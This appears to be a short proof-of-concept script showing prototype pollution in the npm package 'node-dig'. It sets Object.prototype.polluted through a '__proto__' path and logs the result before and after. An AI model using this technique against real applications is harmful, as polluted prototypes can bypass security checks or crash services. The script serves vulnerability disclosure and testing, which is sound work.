var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const nodeDig = require('node-dig');
console.log({}.polluted);
nodeDig(obj, [
    '__proto__',
    'polluted'
], 'yes');
console.log({}.polluted);